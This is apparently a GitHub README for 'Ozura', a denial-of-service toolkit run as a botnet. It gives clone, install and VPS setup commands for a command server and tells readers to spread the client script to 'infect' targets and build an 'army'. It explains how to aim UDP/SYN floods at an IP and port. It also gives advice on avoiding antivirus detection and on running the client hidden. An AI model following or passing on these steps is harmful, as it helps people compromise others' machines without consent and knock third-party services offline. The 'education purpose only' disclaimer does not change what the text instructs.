### This script it's for education purpose only, don't hack yourself !
# Whats is Ozura ?
Ozura is a powerfull toolkit for DoS http services and IP

# Who to use ?
_(Python 3 is nedded and nodejs@12)_

```sh
$ git clone https://github.com/NaNtheDev/Ozura
$ cd Ozura && py setup.py install # Now you just wait and all packages will be installed 
```

# Work in the web ?
Yes you want. You need a Virtual Private Server and after that set the Ozura_Server folder in your VPS and run this following commands:
```sh
$ sudo apt install screen 
$ cd Ozura_Server 
$ screen -S Ozura # After that you is in the session Ozura
$ npm i
$ node index.js
# Now tap: ctrl + a + d for quit the screen session
```
**Now your botnet is ready**
Just share the Ozura_Client/main.py for infect target and after you have your uniq army !

## Images
![ozura](https://github.com/NaNtheDev/Ozura/blob/images/main.PNG?raw=true)

### Attack a target:
![attack panel](https://github.com/NaNtheDev/Ozura/blob/images/attack.PNG?raw=true)
![infos](https://github.com/NaNtheDev/Ozura/blob/images/attack%20terminal.PNG?raw=true)

### Infos:
![Some infos about clients](https://github.com/NaNtheDev/Ozura/blob/images/title.PNG?raw=true)

# Important !
If you try to use udp/syn flood attack you need enter the target look like this: <IP>:<PORT> 1.1.1.1:22 <- for attack ssh port on 1.1.1.1.
I advise you not to compile the application as an executable because most antivirus software will recognize the malicious signature of the application, you can still run the code while being "undetectable" I leave you this explaining how to run applications in hidden mode:
https://qastack.fr/superuser/62525/run-a-batch-file-in-a-completely-hidden-way
